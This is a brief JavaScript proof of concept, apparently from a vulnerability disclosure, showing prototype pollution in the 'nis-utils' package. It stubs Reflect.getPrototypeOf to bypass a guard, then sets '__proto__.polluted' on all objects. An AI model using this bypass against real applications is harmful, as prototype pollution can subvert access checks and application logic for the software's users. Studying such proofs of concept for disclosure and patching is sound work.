Reflect.getPrototypeOf = () => false;
const nisUtils = require('nis-utils');
const object1 = {};
console.log({}.polluted);
nisUtils.object.setValue({}, '__proto__.polluted', 'yes');
console.log({}.polluted);